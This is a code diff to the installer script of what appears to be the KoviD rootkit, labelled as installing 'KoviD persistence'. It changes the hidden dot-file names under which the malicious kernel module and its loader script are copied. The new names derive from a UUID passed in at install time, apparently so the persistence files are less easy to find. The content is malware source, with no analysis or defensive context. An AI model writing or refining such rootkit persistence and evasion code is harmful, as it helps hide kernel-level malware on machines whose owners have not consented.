@@ -2,8 +2,14 @@
 #
 # Install KoviD persistence
 # -hash
-
 set -eou pipefail
+
+# UUIDGEN must be passed as environment variable.
+# Check Makefile, persist.S
+#
+# Use:
+#   UUIDGEN=value ./install.sh
+UUIDGEN=$UUIDGEN
 
 PREFIX="/${0%/*}"
 PREFIX=${PREFIX:-.}
@@ -67,8 +73,8 @@ function do_install_files_error() {
 function do_install_files() {
     local rc=0
 
-    cp -v "$KOVID" "$INSTALL"/.kv.ko || rc=1
-    cp -v "$LOADER" "$INSTALL"/.lm.sh || rc=1
+    cp -v "$KOVID" "$INSTALL"/.$UUIDGEN.ko || rc=1
+    cp -v "$LOADER" "$INSTALL"/.$UUIDGEN.sh || rc=1
 
     return $rc
 }
